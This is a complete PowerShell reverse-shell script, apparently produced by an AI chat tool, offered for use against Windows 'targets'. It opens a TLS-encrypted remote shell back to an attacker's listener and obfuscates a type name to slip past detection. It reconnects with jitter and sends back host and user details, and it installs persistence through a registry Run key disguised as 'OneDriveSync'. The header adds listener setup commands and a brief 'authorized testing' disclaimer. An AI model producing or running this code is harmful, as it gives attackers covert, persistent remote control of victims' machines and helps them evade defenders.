<#
.SYNOPSIS
    An advanced, encrypted, and persistent reverse shell for Windows targets.

.DESCRIPTION
    This script establishes a robust, encrypted (SSL/TLS) reverse shell to a listening
    server. It is designed for authorized penetration testing and educational purposes.

    Key Features:
    - Encrypted Communication: All traffic is wrapped in SSL/TLS to evade network inspection.
    - Connection Resilience: Automatically adds random jitter to its reconnection attempts to
      avoid fixed, predictable network patterns.
    - Initial Recon: Upon connection, it immediately sends back key system details.
    - Persistence Function: Includes a helper function to install itself for persistence
      across reboots using a registry run key.

.PARAMETER IPAddress
    Specifies the IP address of the listening machine. This parameter is required.

.PARAMETER Port
    Specifies the port on the listening machine. This parameter is required.

.PARAMETER NoTls
    A switch parameter. If used, the connection will NOT be encrypted with SSL/TLS.
    This is useful for debugging with a standard Netcat listener. By default, TLS is enabled.

.PARAMETER RetryInterval
    The base number of seconds to wait before attempting to reconnect. Jitter of +/- 5
    seconds will be added. The default is 30 seconds.

.EXAMPLE
    # SETUP: First, create a self-signed cert and start an ncat listener on your machine:
    # openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=example.com"
    # ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 4443

    # USAGE: Run this on the target to connect back with an encrypted PowerShell shell.
    .\advanced_shell.ps1 -IPAddress 10.10.14.12 -Port 4443

.EXAMPLE
    # Connect back without encryption for use with a standard 'nc -lvnp' listener.
    .\advanced_shell.ps1 -IPAddress 10.10.14.12 -Port 4444 -NoTls

.EXAMPLE
    # After gaining access, make the script persistent so it runs on user logon.
    # The script must be saved to a stable path on the target machine first.
    Install-Persistence -ScriptPath "C:\Users\Public\update.ps1"

.LINK
    https://nmap.org/ncat/

.NOTES
    Author: T3 Chat
    Version: 3.0
    Intended for authorized security testing and educational use only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, HelpMessage = "The IP address of the listener.")]
    [string]$IPAddress,

    [Parameter(Mandatory = $true, HelpMessage = "The port on the listener.")]
    [int]$Port,

    [Parameter(Mandatory = $false, HelpMessage = "The shell to spawn ('powershell.exe' or 'cmd.exe').")]
    [ValidateSet('powershell.exe', 'cmd.exe')]
    [string]$Shell = "powershell.exe",

    [Parameter(Mandatory = $false, HelpMessage = "Disables SSL/TLS encryption for the connection.")]
    [switch]$NoTls,

    [Parameter(Mandatory = $false, HelpMessage = "Base seconds to wait before reconnecting.")]
    [int]$RetryInterval = 30
)

# --- Helper Function for Persistence ---
function Install-Persistence {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ScriptPath
    )
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $valueName = "OneDriveSync" # Use a benign-sounding name for evasion
    $command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""

    try {
        Set-ItemProperty -Path $regPath -Name $valueName -Value $command -Force
        Write-Host "[+] Persistence installed successfully in registry." -ForegroundColor Green
        Write-Host "[*] The script will run automatically the next time the user logs in."
    }
    catch {
        Write-Error "[!] Failed to install persistence: $_"
    }
}

# --- Main Execution ---

# Suppress error messages for a cleaner shell experience
$ErrorActionPreference = "SilentlyContinue"

# This loop ensures the script will try to reconnect if the connection ever drops.
while ($true) {
    $client = $null
    $process = $null
    $activeStream = $null

    try {
        Write-Host "[*] Attempting to connect to $IPAddress on port $Port..."

        # 1. Establish the TCP Connection
        # Light obfuscation to potentially evade simple string-based detection
        $tcpClientStr = ("System.{0}.Sockets.{1}client" -f 'Net', 'Tcp')
        $client = New-Object $tcpClientStr
        $client.Connect($IPAddress, $Port)
        $stream = $client.GetStream()

        # 2. Setup Stream (Encrypted or Plaintext)
        if ($NoTls) {
            Write-Host "[+] Plaintext connection established." -ForegroundColor Yellow
            $activeStream = $stream
        }
        else {
            # Wrap the base stream in an SslStream for encryption
            $sslStream = New-Object System.Net.Security.SslStream($stream, $false)
            # Authenticate the session (server name can be anything since we don't validate)
            $sslStream.AuthenticateAsClient("fakeserver.com")
            Write-Host "[+] Encrypted SSL/TLS session established." -ForegroundColor Green
            $activeStream = $sslStream
        }

        # 3. Initial Reconnaissance
        $hostname = $env:COMPUTERNAME
        $whoami = whoami
        $processId = $PID
        $initialRecon = "`n---[ Initial System Info ]---`nHostname: $hostname`nUser:     $whoami`nPID:       $processId`n---------------------------`n`n"
        $encoding = [System.Text.Encoding]::UTF8
        $bytesToSend = $encoding.GetBytes($initialRecon)
        $activeStream.Write($bytesToSend, 0, $bytesToSend.Length)
        $activeStream.Flush()

        # 4. Spawn the Shell Process
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo.FileName = $Shell
        $process.StartInfo.RedirectStandardInput = $true
        $process.StartInfo.RedirectStandardOutput = $true
        $process.StartInfo.RedirectStandardError = $true
        $process.StartInfo.UseShellExecute = $false
        $process.StartInfo.CreateNoWindow = $true
        $process.Start()

        $inputStream = $process.StandardInput
        $outputStream = $process.StandardOutput
        $errorStream = $process.StandardError

        # 5. Main Event Loop to Proxy Data
        $buffer = New-Object Byte[] 8192

        while ($client.Connected -and -not $process.HasExited) {
            # Check for data from the listener -> send to shell
            if ($activeStream.DataAvailable) {
                $bytesRead = $activeStream.Read($buffer, 0, $buffer.Length)
                $command = $encoding.GetString($buffer, 0, $bytesRead)
                $inputStream.WriteLine($command)
            }

            # Check for data from the shell's output streams -> send to listener
            foreach ($stdStream in @($outputStream, $errorStream)) {
                if ($stdStream.Peek() -ne -1) {
                    $output = $stdStream.ReadToEnd()
                    $activeStream.Write($encoding.GetBytes($output), 0, $output.Length)
                    $activeStream.Flush()
                }
            }
            Start-Sleep -Milliseconds 100
        }
    }
    catch {
        # Catch connection errors or other issues without exiting the script
    }
    finally {
        # 6. Cleanup Resources before next retry
        if ($process -and -not $process.HasExited) { $process.Kill() }
        if ($client) { $client.Close() }
    }

    # 7. Wait and Retry with Jitter
    $jitter = Get-Random -Minimum -5 -Maximum 5
    $sleepTime = [Math]::Max(1, $RetryInterval + $jitter) # Ensure sleep is at least 1s
    Write-Host "[!] Connection lost. Retrying in $sleepTime seconds..."
    Start-Sleep -Seconds $sleepTime
}
